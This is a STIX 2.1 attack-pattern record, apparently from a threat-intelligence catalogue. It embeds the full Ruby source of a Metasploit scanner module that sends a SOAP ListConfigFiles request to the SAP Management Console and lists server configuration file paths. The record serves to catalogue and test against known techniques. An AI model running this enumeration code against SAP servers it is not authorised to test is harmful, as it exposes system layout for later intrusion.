{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a61fee32-c65d-4843-b65f-46245ba2ec03",
    "created": "2024-08-14T16:27:01.279721Z",
    "modified": "2024-08-14T16:27:01.279726Z",
    "name": "SAP Management Console List Config Files",
    "description": " This module attempts to list the config files through the SAP Management Console SOAP Interface. Returns a list of config files found in the SAP configuration with its absolute paths inside the server filesystem.  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_mgmt_con_listconfigfiles.rb",
            "external_id": "sap_mgmt_con_listconfigfiles.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'         => 'SAP Management Console List Config Files',\n      'Description'  => %q{\n        This module attempts to list the config files\n        through the SAP Management Console SOAP Interface.\n        Returns a list of config files found in the SAP configuration with its\n        absolute paths inside the server filesystem.\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc' ]\n        ],\n      'Author'       => [\n        'Chris John Riley', # Original msf module\n        'Jacobo Avariento Gimeno' # Minor changes to adapt it for ListConfigFiles webmethod\n      ],\n      'License'      => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'method'   => 'GET'\n    }, 25)\n\n    if not res\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    end\n\n    enum_instance(ip)\n  end\n\n  def enum_instance(rhost)\n    print_status(\"#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface\")\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:ListConfigFiles'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi\n    data << '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    res = send_request_raw({\n      'uri'      => normalize_uri(datastore['URI']),\n      'method'   => 'POST',\n      'data'     => data,\n      'headers'  =>\n        {\n          'Content-Length' => data.length,\n          'SOAPAction'     => '\"\"',\n          'Content-Type'   => 'text/xml; charset=UTF-8',\n        }\n    }, 15)\n\n    unless res\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    end\n\n    if res.code == 500 && res.body =~ %r{<faultstring>(.*)</faultstring>}i\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{$1.strip}\")\n      return\n    end\n\n    if res.code == 200 && res.body =~ %r{<item>([^<]+)</item>}i\n      env = res.body.scan(%r{<item>([^<]+)</item>}i)\n      print_good(\"#{rhost}:#{rport} [SAP] List of Config Files\")\n      env.each do |output|\n        print_good(output.first)\n      end\n      return\n    end\n\n    print_error(\"#{rhost}:#{rport} [SAP] Failed to identify instance properties\")\n  rescue ::Rex::ConnectionError\n    print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}